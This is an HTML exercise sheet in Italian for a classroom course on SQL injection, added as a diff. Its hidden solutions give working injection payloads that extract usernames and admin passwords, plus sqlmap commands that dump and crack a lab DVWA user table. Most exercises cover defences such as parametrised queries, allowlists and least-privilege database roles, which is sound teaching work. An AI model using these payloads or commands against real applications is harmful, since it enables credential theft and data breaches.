@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="it"><head><meta charset="UTF-8"><title>Esercizi Aula G8 - SQL Injection</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,'Segoe UI',sans-serif;background:#F8FAFC;color:#0F1B2D;line-height:1.6;padding:20px}
+.container{max-width:900px;margin:0 auto}
+header{background:linear-gradient(135deg,#0F4C75 0%,#059669 100%);color:#fff;padding:30px;border-radius:12px;margin-bottom:24px}
+header h1{font-size:24px;margin-bottom:6px}
+header p{color:#D1FAE5;font-size:14px}
+.intro{background:#fff;border:1px solid #CBD5E1;border-radius:10px;padding:18px;margin-bottom:20px;font-size:14px}
+.cat{background:#059669;color:#fff;padding:10px 16px;border-radius:8px;margin:24px 0 14px;font-size:14px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px}
+.ex{background:#fff;border:1px solid #CBD5E1;border-radius:10px;padding:20px;margin-bottom:14px}
+.ex-num{display:inline-block;background:#10B981;color:#fff;padding:3px 10px;border-radius:6px;font-size:12px;font-weight:700;margin-bottom:10px}
+.ex h3{font-size:16px;margin-bottom:10px;color:#0F1B2D}
+.ex p{font-size:14px;margin-bottom:10px;color:#334155}
+.ex ul{margin:8px 0 10px 22px;font-size:13px;color:#475569}
+.ex ol{margin:8px 0 10px 22px;font-size:13px;color:#475569}
+details{margin-top:12px;background:#F0FDF4;border-radius:6px;padding:10px 14px}
+summary{cursor:pointer;font-weight:600;color:#059669;font-size:13px}
+details[open] summary{margin-bottom:8px}
+.sol{font-size:13px;color:#0F1B2D;line-height:1.7}
+.sol code{background:#1E293B;color:#34D399;padding:2px 6px;border-radius:4px;font-family:Consolas,monospace;font-size:12px}
+.sol pre{background:#1E293B;color:#E2E8F0;padding:10px 12px;border-radius:6px;margin:8px 0;overflow-x:auto;font-family:Consolas,monospace;font-size:11px;line-height:1.4}
+code{background:#1E293B;color:#34D399;padding:2px 6px;border-radius:4px;font-family:Consolas,monospace;font-size:12px}
+pre{background:#1E293B;color:#E2E8F0;padding:12px 14px;border-radius:6px;margin:10px 0;overflow-x:auto;font-family:Consolas,monospace;font-size:12px;line-height:1.45}
+pre code{background:transparent;color:#E2E8F0;padding:0}
+</style></head><body><div class="container">
+<header><h1>📚 Esercizi Aula G8</h1><p>SQL Injection &amp; difese applicative · 10 esercizi · ~50 minuti</p></header>
+<div class="intro"><strong>Modalità di lavoro:</strong> esercizi da svolgere in aula, individualmente o in coppia. Discussione plenaria dopo ogni categoria. Le soluzioni sono nascoste — apritele solo dopo aver provato. Categoria A prima della demo (pre-demo), B e C durante/dopo demo, D dopo le difese.</div>
+
+<div class="cat">Categoria A · Riconoscere la SQLi nel codice</div>
+
+<div class="ex"><span class="ex-num">ESERCIZIO 1</span><h3>Le 3 condizioni — applicale</h3>
+<p>Per ognuno dei seguenti snippet, verifica la presenza delle 3 condizioni necessarie per una SQLi: (1) input user-controlled, (2) flusso verso query, (3) nessuna parametrizzazione.</p>
+<pre><code>A)  uid = request.form['id']
+    cursor.execute("SELECT * FROM users WHERE id=%s", (uid,))
+
+B)  name = os.environ['DEFAULT_USER']  # da var ambiente
+    q = f"SELECT * FROM users WHERE name='{name}'"
+    db.execute(q)
+
+C)  search = request.args.get('q')
+    q = "SELECT * FROM products WHERE title LIKE '%" + search + "%'"
+    cursor.execute(q)</code></pre>
+<details><summary>Mostra soluzione</summary><div class="sol">
+<strong>A · NON vulnerabile.</strong> Input user-controlled (condizione 1) e flusso verso query (2), ma c'è parametrizzazione con <code>%s</code> (condizione 3 rotta). Sicuro.<br><br>
+<strong>B · NON vulnerabile (al momento).</strong> L'input viene da variabile d'ambiente controllata dal sysadmin, NON dall'utente (condizione 1 rotta). Attenzione: se in futuro quella variabile venisse alimentata da input esterno, diventerebbe vulnerabile — <em>second-order</em>.<br><br>
+<strong>C · VULNERABILE.</strong> Tutte e 3 le condizioni presenti: input da query string, concatenato in stringa SQL, nessuna parametrizzazione. Payload di attacco banale: <code>%' UNION SELECT username,password FROM users--</code>.
+</div></details></div>
+
+<div class="ex"><span class="ex-num">ESERCIZIO 2</span><h3>Trova il tipo di SQLi</h3>
+<p>Per ognuno di questi scenari indica il <strong>tipo di SQLi</strong> più adatto all'attaccante (error / UNION / boolean / time / OOB) e perché:</p>
+<ol>
+<li>API REST che ritorna sempre <code>{"status":"ok"}</code> in caso di successo, <code>{"status":"error"}</code> in caso di errore, con stesso HTTP 200.</li>
+<li>Pagina di ricerca prodotti che mostra risultati in tabella HTML.</li>
+<li>Form di login che restituisce sempre la stessa pagina di errore 'Credenziali non valide' indipendentemente dal motivo.</li>
+<li>App dev con error page verbosa che stampa stack trace PHP.</li>
+<li>Target blindato dietro firewall restrittivo, ma il DB è autorizzato a fare lookup DNS esterni.</li>
+</ol>
+<details><summary>Mostra soluzione</summary><div class="sol">
+<strong>1 → Blind Boolean-based.</strong> C'è differenza osservabile tra risposte (ok/error), anche se minima. Si inferisce 1 bit per request.<br><br>
+<strong>2 → In-band UNION-based.</strong> Tabella HTML = punto di output visibile. UNION SELECT appende righe che compaiono nella tabella.<br><br>
+<strong>3 → Blind Time-based.</strong> Nessuna differenza nel body né nello status. Serve <code>pg_sleep</code> / <code>SLEEP(5)</code> come canale di feedback.<br><br>
+<strong>4 → In-band Error-based.</strong> Error page verbosa = canale diretto. Basta forzare un errore con payload tipo <code>' AND 1=CAST(version() AS int)--</code>.<br><br>
+<strong>5 → Out-of-band (OOB).</strong> Scenario classico: DNS egress aperto è il canale di esfiltrazione quando tutto il resto è bloccato.
+</div></details></div>
+
+<div class="ex"><span class="ex-num">ESERCIZIO 3</span><h3>Costruisci il payload</h3>
+<p>Dato questo snippet PHP vulnerabile:</p>
+<pre><code>$id = $_GET['id'];
+$q = "SELECT name, price FROM products WHERE id=" . $id;
+$result = mysqli_query($conn, $q);</code></pre>
+<p>Costruisci 3 payload di attacco, uno per ogni tipo:</p>
+<ol>
+<li>In-band UNION per estrarre la colonna <code>user</code> e <code>password</code> dalla tabella <code>users</code></li>
+<li>Blind boolean per verificare se la prima lettera della password di <code>admin</code> è <code>'a'</code></li>
+<li>Blind time per lo stesso obiettivo del punto 2</li>
+</ol>
+<details><summary>Mostra soluzione</summary><div class="sol">
+<strong>1 · UNION-based</strong> (assumendo MySQL, 2 colonne):<br>
+<code>?id=-1 UNION SELECT user,password FROM users--</code><br>
+Passaggio <code>id=-1</code> forza la prima query a non restituire nulla, quindi la tabella HTML mostra solo i risultati della seconda SELECT.<br><br>
+<strong>2 · Boolean-based:</strong><br>
+<code>?id=1 AND SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='a'</code><br>
+Se la prima lettera è 'a' → id=1 ritorna il prodotto. Altrimenti ritorna pagina vuota.<br><br>
+<strong>3 · Time-based:</strong><br>
+<code>?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='a',SLEEP(5),0)</code><br>
+Se lettera 1 = 'a' → il DB dorme 5 secondi. Altrimenti risposta istantanea.
+</div></details></div>
+
+<div class="cat">Categoria B · Live demo sqlmap contro DVWA</div>
+
+<div class="ex"><span class="ex-num">ESERCIZIO 4</span><h3>Ricostruisci il comando sqlmap</h3>
+<p>Durante la demo, il formatore ha usato sqlmap contro DVWA. Senza guardare le slide, ricostruisci il comando esatto per:</p>
+<ol>
+<li>Testare il parametro <code>id</code> della pagina vulnerabilities/sqli/ autenticato con cookie di sessione e security=low</li>
+<li>Dopo detection, enumerare tutte le tabelle del database <code>dvwa</code></li>
+<li>Dumpare la tabella <code>users</code> con crack automatico delle password</li>
+</ol>
+<details><summary>Mostra soluzione</summary><div class="sol"><pre>1) sqlmap -u 'http://localhost:8080/vulnerabilities/sqli/?id=1' \
+     --cookie='PHPSESSID=xxx; security=low' --batch
+
+2) sqlmap -u 'http://localhost:8080/vulnerabilities/sqli/?id=1' \
+     --cookie='PHPSESSID=xxx; security=low' \
+     -D dvwa --tables
+
+3) sqlmap -u 'http://localhost:8080/vulnerabilities/sqli/?id=1' \
+     --cookie='PHPSESSID=xxx; security=low' \
+     -D dvwa -T users --dump --passwords</pre>
+Note: <code>--batch</code> per evitare prompt interattivi, utile in tutti gli step. <code>--passwords</code> aggiunge il crack automatico via hashcat/john con rockyou.txt.</div></details></div>
+
+<div class="ex"><span class="ex-num">ESERCIZIO 5</span><h3>Interpreta il fingerprint</h3>
+<p>Durante la demo sqlmap ha prodotto questo output:</p>
+<pre><code>back-end DBMS: MySQL &gt;= 5.0.12
+banner: '5.7.28-0ubuntu0.18.04.4'
+current user: 'dvwa@localhost'
+current database: 'dvwa'
+current user is DBA: False
+available databases [4]:
+[*] dvwa
+[*] information_schema
+[*] mysql
+[*] performance_schema</code></pre>
+<p>Rispondi:</p>
+<ol>
+<li>Perché "current user is DBA: False" è una buona notizia per chi ha configurato il DB?</li>
+<li>Quali dei 4 database hanno dati "di business" e quali sono di sistema?</li>
+<li>Il flag <code>--os-shell</code> funzionerà in questo caso? Motiva.</li>
+</ol>
+<details><summary>Mostra soluzione</summary><div class="sol">
+<strong>1.</strong> DBA=False significa che l'app non si collega come superuser. L'attaccante non può fare <code>CREATE USER</code>, <code>GRANT</code>, né scrivere file su disco via <code>INTO OUTFILE</code>. È un esempio di <strong>Least Privilege Principle</strong> applicato (Difesa 4).<br><br>
+<strong>2.</strong> Business: <code>dvwa</code>. Sistema: <code>information_schema</code> (catalog standard SQL, metadata), <code>mysql</code> (DB di sistema con utenti e privilegi MySQL), <code>performance_schema</code> (metriche runtime).<br><br>
+<strong>3. NO</strong>, <code>--os-shell</code> non funzionerà perché richiede privilegi DBA per abilitare <code>INTO OUTFILE</code> su directory scrivibile o creare UDF. Con user non-DBA, l'impatto massimo è lettura dati dalle tabelle accessibili.
+</div></details></div>
+
+<div class="cat">Categoria C · Difese · scrivi il codice fix</div>
+
+<div class="ex"><span class="ex-num">ESERCIZIO 6</span><h3>Fix Python · prepared statement</h3>
+<p>Data questa funzione Flask vulnerabile, riscrivila con prepared statement psycopg2:</p>
+<pre><code>@app.route('/user/&lt;uid&gt;')
+def user_detail(uid):
+    role = request.args.get('role', 'viewer')
+    q = f"""
+        SELECT u.name, u.email, r.permissions
+        FROM users u
+        JOIN roles r ON u.role_id=r.id
+        WHERE u.id = {uid}
+        AND r.name = '{role}'
+    """
+    return db.execute(q).fetchone()</code></pre>
+<details><summary>Mostra soluzione</summary><div class="sol"><pre>@app.route('/user/&lt;uid&gt;')
+def user_detail(uid):
+    role = request.args.get('role', 'viewer')
+    cursor.execute(
+        "SELECT u.name, u.email, r.permissions "
+        "FROM users u "
+        "JOIN roles r ON u.role_id=r.id "
+        "WHERE u.id = %s "
+        "AND r.name = %s",
+        (uid, role)
+    )
+    return cursor.fetchone()</pre>
+Note: entrambi i parametri (uid, role) vengono passati SEPARATAMENTE dalla query. Il driver psycopg2 gestisce il tipo (uid come int, role come string) automaticamente. Nota: <code>uid</code> arriva come stringa da Flask routing, va bene così — il driver lo converte in int per la query se la colonna è INT.</div></details></div>
+
+<div class="ex"><span class="ex-num">ESERCIZIO 7</span><h3>Allowlist per ORDER BY</h3>
+<p>Devi permettere agli utenti di ordinare una lista prodotti per nome, prezzo, data o popolarità. <code>ORDER BY</code> non è parametrizzabile come valore. Scrivi il codice Python + SQL che applica allowlist correttamente.</p>
+<details><summary>Mostra soluzione</summary><div class="sol"><pre>ALLOWED_SORT = {
+    'name': 'name ASC',
+    'price_asc': 'price ASC',
+    'price_desc': 'price DESC',
+    'date': 'created_at DESC',
+    'popularity': 'view_count DESC',
+}
+
+@app.route('/products')
+def products():
+    sort_key = request.args.get('sort', 'name')
+    # allowlist: se non presente, default sicuro
+    order_by = ALLOWED_SORT.get(sort_key, ALLOWED_SORT['name'])
+    
+    cursor.execute(
+        f"SELECT id, name, price FROM products ORDER BY {order_by}"
+    )
+    return cursor.fetchall()</pre>
+Punti chiave:<br>
+1. <code>ALLOWED_SORT</code> è un dict finito, NON può contenere SQLi.<br>
+2. Se l'utente manda <code>?sort=malicious</code> o <code>?sort=id; DROP TABLE</code>, il <code>.get()</code> ritorna il default.<br>
+3. La concatenazione <code>f"... {order_by}"</code> è sicura PERCHÉ <code>order_by</code> è garantito essere uno dei valori del dict.<br>
+4. Il dict mappa chiave logica → frammento SQL, permettendo di cambiare il SQL (es. aggiungere un secondary sort) senza esporre logica SQL al client.</div></details></div>
+
+<div class="ex"><span class="ex-num">ESERCIZIO 8</span><h3>DDL PostgreSQL · LPP DB user</h3>
+<p>Un'app e-commerce ha 3 tipi di ruoli runtime:</p>
+<ul>
+<li><strong>app_web</strong>: serve il frontend, deve leggere/scrivere <code>users</code>, <code>orders</code>, <code>cart_items</code></li>
+<li><strong>app_admin</strong>: backoffice, oltre alle 3 tabelle sopra ha lettura anche di <code>audit_log</code> e può aggiornare <code>orders.status</code></li>
+<li><strong>reporting</strong>: Grafana dashboard, sola lettura su <code>orders</code> e <code>users</code></li>
+</ul>
+<p>Scrivi il DDL PostgreSQL per i 3 utenti con permessi minimi.</p>
+<details><summary>Mostra soluzione</summary><div class="sol"><pre>-- Utenti base con NO privilege
+CREATE USER app_web WITH NOSUPERUSER NOCREATEDB
+    NOCREATEROLE NOREPLICATION NOBYPASSRLS PASSWORD '...';
+CREATE USER app_admin WITH NOSUPERUSER NOCREATEDB
+    NOCREATEROLE NOREPLICATION NOBYPASSRLS PASSWORD '...';
+CREATE USER reporting WITH NOSUPERUSER NOCREATEDB
+    NOCREATEROLE NOREPLICATION NOBYPASSRLS PASSWORD '...';
+
+-- Permessi base (CONNECT + USAGE)
+GRANT CONNECT ON DATABASE ecommerce TO app_web, app_admin, reporting;
+GRANT USAGE ON SCHEMA public TO app_web, app_admin, reporting;
+
+-- app_web: CRUD su 3 tabelle
+GRANT SELECT, INSERT, UPDATE, DELETE ON users, orders, cart_items TO app_web;
+GRANT USAGE ON ALL SEQUENCES IN SCHEMA public TO app_web;
+
+-- app_admin: come app_web + lettura audit + update status
+GRANT SELECT, INSERT, UPDATE, DELETE ON users, orders, cart_items TO app_admin;
+GRANT SELECT ON audit_log TO app_admin;
+GRANT USAGE ON ALL SEQUENCES IN SCHEMA public TO app_admin;
+
+-- reporting: solo SELECT
+GRANT SELECT ON orders, users TO reporting;</pre>
+Note: (1) NO DDL per nessuno dei 3 — le migrations usano utente separato <code>app_migration</code> attivato solo in deploy. (2) <code>USAGE ON SEQUENCES</code> serve per <code>nextval()</code> sui campi auto-increment durante INSERT. (3) <code>reporting</code> non ha GRANT su <code>cart_items</code>: non serve per dashboard, meglio minimizzare.</div></details></div>
+
+<div class="cat">Categoria D · Scenari realistici</div>
+
+<div class="ex"><span class="ex-num">ESERCIZIO 9</span><h3>Code review · trova 3 bug</h3>
+<p>Code review di questo endpoint Flask. Identifica almeno 3 problemi di sicurezza e come li risolveresti:</p>
+<pre><code>@app.route('/admin/user-search', methods=['POST'])
+def user_search():
+    name = request.form.get('name')
+    dept = request.form.get('department')
+    
+    # 1
+    q = f"SELECT * FROM users WHERE name LIKE '%{name}%'"
+    if dept:
+        q += f" AND department = '{dept}'"
+    
+    # 2
+    try:
+        result = db.execute(q).fetchall()
+    except Exception as e:
+        return f"DB error: {e}", 500
+    
+    # 3
+    return jsonify([dict(r) for r in result])</code></pre>
+<details><summary>Mostra soluzione</summary><div class="sol">
+<strong>Bug 1 · Concatenazione SQL doppia (nome + department).</strong> Entrambi i parametri vanno in stringa SQL. Fix: prepared statements con <code>%s</code> per entrambi e query costruita dinamicamente ma con bind.<br><br>
+<strong>Bug 2 · Error message leak.</strong> In caso di errore DB, l'eccezione viene restituita al client. Se la query fallisce con "column 'email' does not exist", l'attaccante scopre lo schema. Fix: loggare <code>e</code> server-side, restituire errore generico al client.<br><br>
+<strong>Bug 3 · Endpoint /admin senza auth check.</strong> Non c'è controllo di ruolo. Chiunque conosca l'URL può cercare user/dept. Fix: decoratore <code>@require_admin</code> o middleware che verifica JWT/cookie con ruolo.<br><br>
+<strong>Bonus · Manca input validation.</strong> <code>name</code> e <code>dept</code> potrebbero essere <code>None</code>, lunghissimi, o contenere char inutili. Fix: validazione lunghezza + whitelist caratteri se applicabile.<br><br>
+Versione corretta:
+<pre>@app.route('/admin/user-search', methods=['POST'])
+@require_admin
+def user_search():
+    name = request.form.get('name', '').strip()[:100]
+    dept = request.form.get('department', '').strip()[:50]
+    
+    if dept:
+        cursor.execute(
+            "SELECT id,name,email FROM users "
+            "WHERE name ILIKE %s AND department = %s",
+            (f'%{name}%', dept)
+        )
+    else:
+        cursor.execute(
+            "SELECT id,name,email FROM users WHERE name ILIKE %s",
+            (f'%{name}%',)
+        )
+    
+    try:
+        result = cursor.fetchall()
+    except Exception as e:
+        app.logger.error(f"DB error: {e}")
+        return jsonify({"error": "search failed"}), 500
+    
+    return jsonify([dict(r) for r in result])</pre>
+</div></details></div>
+
+<div class="ex"><span class="ex-num">ESERCIZIO 10</span><h3>Scenario completo · progetta le difese</h3>
+<p>Sei il security architect di una nuova API REST per un'app bancaria. Il team dev propone questo stack:</p>
+<ul>
+<li>FastAPI (Python) + SQLAlchemy ORM</li>
+<li>PostgreSQL 16 in RDS AWS</li>
+<li>AWS WAF davanti all'ALB</li>
+<li>L'app gira come <code>postgres</code> user per "semplicità del deploy"</li>
+</ul>
+<p>Il PM chiede: "Abbiamo già ORM e WAF, basta così?". Rispondi con un piano di difesa in 5 punti concreti, ordinati per priorità.</p>
+<details><summary>Mostra risposta tipica</summary><div class="sol">
+<strong>No, assolutamente non basta.</strong> Ecco il piano in 5 punti:<br><br>
+<strong>1 · STOP · usare <code>postgres</code> superuser come app user è inaccettabile per un'app bancaria.</strong> Prima di andare live: creare <code>app_runtime</code> con <code>NOSUPERUSER</code> + GRANT minimi sulle tabelle di business. Questo è il fix più urgente — senza di esso, una singola SQLi = game over (COPY FROM PROGRAM → RCE → esfiltrazione di tutto il DB).<br><br>
+<strong>2 · Code review ORM · audit "raw()" / "text()" / "execute()".</strong> SQLAlchemy è sicuro con API idiomatica, ma ogni <code>session.execute(text(...))</code> o <code>.raw()</code> deve essere esaminato. Se ci sono, devono usare <code>.bindparams()</code>. Automazione: regola <code>bandit</code> o <code>semgrep</code> nel CI che segnala questi pattern.<br><br>
+<strong>3 · Input validation + Pydantic schema.</strong> FastAPI ha Pydantic di default: usarlo per validare TUTTI gli input in ingresso. Tipi forti (int, UUID, Decimal, enum) bloccano la maggior parte dei payload SQLi banali prima che tocchino il DB.<br><br>
+<strong>4 · Logging + audit · pgAudit attivato.</strong> App bancaria = compliance. Installare pgAudit, configurare <code>pgaudit.log = 'write,ddl'</code> o <code>'all'</code> in base alla sensibilità. Integrazione con CloudWatch + alerting per anomalie (query unexpected, UNION, slow query &gt; 5s).<br><br>
+<strong>5 · WAF come ultimo livello, non primo.</strong> AWS WAF con OWASP Top 10 Managed Rules è utile per rallentare attacchi automatizzati e loggare pattern noti. MA: ha bypass, falsi positivi, e NON sostituisce i punti 1-4. Tenerlo in modalità "count" per 2 settimane per tarare le regole prima di switch a "block".<br><br>
+<strong>Bonus · RLS per data isolation.</strong> Per app multi-tenant bancaria, considerare Row-Level Security su tabelle critiche (conti, transazioni): utente X vede solo <code>tenant_id = X</code>. Difesa completa contro SQLi su filtraggio authorization.
+</div></details></div>
+
+</div></body></html>
